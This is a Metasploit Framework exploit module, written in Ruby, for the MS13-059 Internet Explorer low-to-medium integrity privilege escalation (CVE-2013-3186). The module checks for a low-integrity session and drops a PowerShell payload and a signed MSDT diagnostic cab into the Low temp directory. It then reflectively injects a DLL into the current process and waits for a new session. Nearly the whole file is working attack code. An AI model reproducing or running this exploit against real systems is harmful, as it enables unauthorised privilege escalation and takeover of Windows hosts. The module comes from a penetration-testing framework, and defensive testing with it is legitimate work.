##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::Powershell
	include Msf::Exploit::FileDropper
	include Msf::Post::File
	include Msf::Post::Windows::FileInfo

	def initialize(info={})
		super( update_info( info,
			'Name'		=> 'MS13-059 IE Low to Medium Integrity Privilege Escalation',
			'Description'	=> %q{
				The HKLM\Software\Microsoft\Internet Explorer\Low Rights\Elevation Policy
			lists programs that will run as Medium Integrity when spawned from IE if the policy
			value is set to 3. The MS Diagnostic Tool (MSDT.exe) allows users to specify a 
			package or a cab on the command line to troubleshoot certain issues. This cab file
			basically consists of a number of powershell files which are run to diagnose and
			fix issues found. MSDT is one of the programs set to run as Medium Integrity.

			MSDT requires that files are signed with a valid code signing certificate. This
			module includes a self-signed diagnostic package as a proof of concept. To try
			it install the certificate from DiagPackage.cat to the Trusted Root Certificate
			and Trusted Publisher Certificate Authority stores.

			To generate your own signed cab the easiest tool to use is TSPDesigner from the Windows
			SDK. Alternatively the package files are based on xml, powershell and stored in cab
			files and could be signed by signtool.exe or osslsigncode.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=>
				[
					'Fermin J. Serna', # Discovery
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit module
				],
			'Platform'	=> [ 'win' ],
			'SessionTypes'	=> [ 'meterpreter' ],
			'Targets'	=>
			[
				[ 'Windows x86', { 'Arch' => ARCH_X86 } ],
				[ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
			],
			'DefaultTarget' => 0,
			'DisclosureDate'=> "Nov 27 2012",
			'References' =>
				[
					[ 'CVE', '2013-3186' ],
					[ 'MSB', 'MS13-059' ],
					[ 'OSVDB', '96191'],
					[ 'URL', 'http://zhodiac.hispahack.com/index.php?section=blog&day=21&month=8&year=2013' ]

				]
		))

		register_options(
			[
				OptPath.new('CAB', [false, 'Path to user signed Diagnostic Package Cab']),
				OptBool.new("ExitOnSession", [ true, "Return from the exploit after a session has been created", true ]),
				OptInt.new("ListenerTimeout", [ true, "The maximum number of seconds to wait for new sessions", 120])
			], self.class
		)

	end

	def low_integrity_level?
		tmp_dir = expand_path("%USERPROFILE%")
		cd(tmp_dir)
		new_dir = "#{rand_text_alpha(5)}"
		begin
			session.shell_command_token("mkdir #{new_dir}")
		rescue
			return true
		end

		if directory?(new_dir)
			session.shell_command_token("rmdir #{new_dir}")
			return false
		else
			return true
		end
	end

	def exploit
		# First of all check if the session is running on Low Integrity Level.
		print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
		fail_with(Failure::NotVulnerable, "Not running at Low Integrity!") unless low_integrity_level?

		# Hardcoded payload name for proof of concept due to signing issues
		payload_file = "payload.ps1"
		diag_cab = "DiagPkg.diagcab"

		tmp_dir = expand_path("%TEMP%")
		tmp_dir << "\\Low" unless tmp_dir[-3,3] =~ /Low/i

		payload_file = "#{tmp_dir}\\#{payload_file}"
		diag_cab = "#{tmp_dir}\\#{diag_cab}"

		ps1 = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)

		if datastore['CAB']
			dc_local_path = datastore['CAB']
		else
			dc_local_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2013-3186", "cve-2013-3186.diagcab")
		end

		dc = ''
		File.open( dc_local_path, "rb" ) { |f| dc += f.read(f.stat.size) }

		dll_local_path =  ::File.join(Msf::Config.data_directory, "exploits", "cve-2013-3186", "cve-2013-3186.dll")
		dll = ''
		File.open( dll_local_path, "rb" ) { |f| dll += f.read(f.stat.size) }

		print_status("Trying to drop payload to #{tmp_dir}...")
		if write_file(payload_file, ps1)
			print_good("Payload dropped successfully...")
			register_file_for_cleanup(payload_file)
		else
			fail_with(Failure::Unknown, "Failed to drop payload to File System.")
		end

		print_status("Trying to drop Diagnostic Package to #{tmp_dir}...")
		if write_file(diag_cab, dc)
			print_good("Diagnostic Package dropped successfully...")
			register_file_for_cleanup(diag_cab)
		else
			fail_with(Failure::Unknown, "Failed to drop payload to File System.")
		end

		pid = client.sys.process.getpid
		pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )

		offset = 0
		pe.exports.entries.each do |entry|
			if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
				offset = pe.rva_to_file_offset( entry.rva )
				break
			end
		end

		if offset.nil? or offset == 0
			fail_with(Failure::Unknown, "Reflective Loader offset is nil.")
		end

		if dll.nil? or dll.empty?
			fail_with(Failure::Unknown, "Invalid DLL.")
		end

		if pid.nil?
			fail_with(Failure::Unknown, "Invalid PID.")
		end

		print_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
		begin
			vprint_status("Opening process #{pid}")
			host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
			vprint_status("Allocating memory in procees #{pid}")
			mem = host_process.memory.allocate(dll.length + (dll.length % 1024))
			# Ensure memory is set for execution
			host_process.memory.protect(mem)
			vprint_status("Allocated memory at address #{"0x%.8x" % mem}, for #{dll.length} bytes")
			vprint_status("Writing the payload into memory")
			host_process.memory.write(mem, dll)
			vprint_status("Executing payload")
			host_process.thread.create(mem+offset, 0)
			print_good("Successfully injected payload in to process: #{pid}")
		rescue ::Exception => e
			print_error("Failed to Inject Payload to #{pid}!")
			vprint_error(e.to_s)
		end

		print_status("Waiting for user to run the Diagnostic...")
		if not datastore['ExitOnSession'] and not job_id
			fail_with(Failure::Unknown, "Setting ExitOnSession to false requires running as a job (exploit -j)")
		end

		stime = Time.now.to_f
		vprint_status "Starting the payload handler..."
		while(true)
			break if session_created? and datastore['ExitOnSession']
			break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )

			select(nil,nil,nil,1)
		end
	end
end

